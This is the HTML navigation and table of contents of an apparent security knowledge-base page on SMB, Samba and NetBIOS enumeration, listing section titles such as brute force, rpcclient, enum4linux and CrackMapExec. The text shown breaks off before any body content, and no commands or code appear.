



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>SMB Samba NetBIOS 135 139,445 - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#summary" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                SMB Samba NetBIOS 135 139,445
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases-sqlserver/" title="Databases sqlserver" class="md-nav__link">
      Databases sqlserver
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../dfir/" title="Dfir" class="md-nav__link">
      Dfir
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../osint/" title="Osint" class="md-nav__link">
      Osint
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
      Rf and sdr
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows-active-directory/" title="Windows active directory" class="md-nav__link">
      Windows active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27" type="checkbox" id="nav-27">
    
    <label class="md-nav__link" for="nav-27">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-27">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/cissp/" title="Cissp" class="md-nav__link">
      Cissp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/osce/" title="Osce" class="md-nav__link">
      Osce
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3" type="checkbox" id="nav-27-3">
    
    <label class="md-nav__link" for="nav-27-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-27-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9" type="checkbox" id="nav-27-3-9">
    
    <label class="md-nav__link" for="nav-27-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-27-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-27-3-9-10" type="checkbox" id="nav-27-3-9-10">
    
    <label class="md-nav__link" for="nav-27-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-27-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-28" type="checkbox" id="nav-28">
    
    <label class="md-nav__link" for="nav-28">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-28">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
    
    <label class="md-nav__link" for="nav-29">
      Identity and access management
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-29">
        Identity and access management
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../identity-and-access-management/jwt/" title="Jwt" class="md-nav__link">
      Jwt
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../identity-and-access-management/kerberos/" title="Kerberos" class="md-nav__link">
      Kerberos
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../identity-and-access-management/oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
      Oauth2 and oidc
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
    
    <label class="md-nav__link" for="nav-30">
      Network
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-30">
        Network
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/discovery/" title="Discovery" class="md-nav__link">
      Discovery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/domain-fronting/" title="Domain Fronting" class="md-nav__link">
      Domain Fronting
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/port-forwarding-and-tunneling/" title="Port Forwarding" class="md-nav__link">
      Port Forwarding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/port-scanning/" title="Port Scanning" class="md-nav__link">
      Port Scanning
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/traffic-analysis/" title="Traffic Analysis" class="md-nav__link">
      Traffic Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/vulnerability-scanning/" title="Vulnerability Scanning" class="md-nav__link">
      Vulnerability Scanning
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/wireless/" title="Wireless" class="md-nav__link">
      Wireless
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/x-Defense/" title="x Defense" class="md-nav__link">
      x Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/y-Tools-Netcat/" title="y Tools Netcat" class="md-nav__link">
      y Tools Netcat
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/y-Tools-Netstat/" title="y Tools Netstat" class="md-nav__link">
      y Tools Netstat
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/y-Tools-Nmap/" title="Nmap" class="md-nav__link">
      Nmap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../network/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31">
    
    <label class="md-nav__link" for="nav-31">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-31">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1" type="checkbox" id="nav-31-1">
    
    <label class="md-nav__link" for="nav-31-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-31-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/api/" title="Windows API" class="md-nav__link">
      Windows API
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/applocker/" title="Applocker" class="md-nav__link">
      Applocker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/events/" title="Events" class="md-nav__link">
      Events
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/hyperv/" title="HyperV" class="md-nav__link">
      HyperV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-endpoints/" title="Important Endpoints" class="md-nav__link">
      Important Endpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-issues/" title="Important issues" class="md-nav__link">
      Important issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
      Important Registry Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
      Kernel Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/user-accounts/" title="User accounts" class="md-nav__link">
      User accounts
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/wmi/" title="Wmi" class="md-nav__link">
      Wmi
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/x-Bypass/" title="Defense Bypass" class="md-nav__link">
      Defense Bypass
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/x-Defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-22" type="checkbox" id="nav-31-1-22">
    
    <label class="md-nav__link" for="nav-31-1-22">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-31-1-22">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31-1-23" type="checkbox" id="nav-31-1-23">
    
    <label class="md-nav__link" for="nav-31-1-23">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-31-1-23">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../os/windows/powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32" checked>
    
    <label class="md-nav__link" for="nav-32">
      Protocols and ports
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-32">
        Protocols and ports
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Citrix-1494/" title="Citrix 1494" class="md-nav__link">
      Citrix 1494
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../DHCP/" title="DHCP" class="md-nav__link">
      DHCP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../DNS-53/" title="DNS 53" class="md-nav__link">
      DNS 53
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../ElasticSearch-9200/" title="Interesting APIs" class="md-nav__link">
      Interesting APIs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../FTP-21/" title="FTP 21" class="md-nav__link">
      FTP 21
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Finger-79/" title="Finger 79" class="md-nav__link">
      Finger 79
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../HTTP-HTTPS-80,443/" title="HTTP HTTPS 80,443" class="md-nav__link">
      HTTP HTTPS 80,443
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../IMAP-143,993/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../IRC-8067/" title="IRC 8067" class="md-nav__link">
      IRC 8067
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../LDAP-389/" title="LDAP 389" class="md-nav__link">
      LDAP 389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Memcache/" title="Memcache" class="md-nav__link">
      Memcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Modbus-502/" title="Modbus 502" class="md-nav__link">
      Modbus 502
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../MySQL-3306/" title="MySQL 3306" class="md-nav__link">
      MySQL 3306
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../NFS-2049/" title="NFS 2049" class="md-nav__link">
      NFS 2049
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../NTP-123/" title="NTP 123" class="md-nav__link">
      NTP 123
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Oracle-1521/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../POP3-110/" title="POP3 110" class="md-nav__link">
      POP3 110
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../PPTP-L2TP-VPN-500,1723/" title="PPTP L2TP VPN 500,1723" class="md-nav__link">
      PPTP L2TP VPN 500,1723
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Portmapper-111/" title="Portmapper 111" class="md-nav__link">
      Portmapper 111
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../RDP-3389/" title="RDP 3389" class="md-nav__link">
      RDP 3389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../RPC-135,445/" title="RPC 135,445" class="md-nav__link">
      RPC 135,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../SIP-5060/" title="SIP 5060" class="md-nav__link">
      SIP 5060
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        SMB Samba NetBIOS 135 139,445
      </label>
    
    <a href="./" title="SMB Samba NetBIOS 135 139,445" class="md-nav__link md-nav__link--active">
      SMB Samba NetBIOS 135 139,445
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    Summary
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#server-message-block-smb-versions" class="md-nav__link">
    Server Message Block (SMB) Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ports" class="md-nav__link">
    Ports
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#netbios-suffixes" class="md-nav__link">
    NetBIOS suffixes
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#version" class="md-nav__link">
    Version
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brute-force" class="md-nav__link">
    Brute force
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumerate" class="md-nav__link">
    User enumerate
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scanning" class="md-nav__link">
    Scanning
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#nmap" class="md-nav__link">
    nmap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nmblookup" class="md-nav__link">
    nmblookup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nbtscan" class="md-nav__link">
    nbtscan
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nbtstat" class="md-nav__link">
    nbtstat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbmap-enumerate-samba-share-drives-across-an-entire-domain" class="md-nav__link">
    SMBMap - enumerate samba share drives across an entire domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smbclient" class="md-nav__link">
    smbclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rpcclient" class="md-nav__link">
    rpcclient
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enum4linux" class="md-nav__link">
    Enum4linux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pth-winexe" class="md-nav__link">
    pth-winexe
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nullinux" class="md-nav__link">
    nullinux
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#acccheck" class="md-nav__link">
    acccheck
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#mblookup" class="md-nav__link">
    mblookup
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#crackmapexec" class="md-nav__link">
    CrackMapExec
  </a>
  
</li>
        
          <li class="md-nav__item">
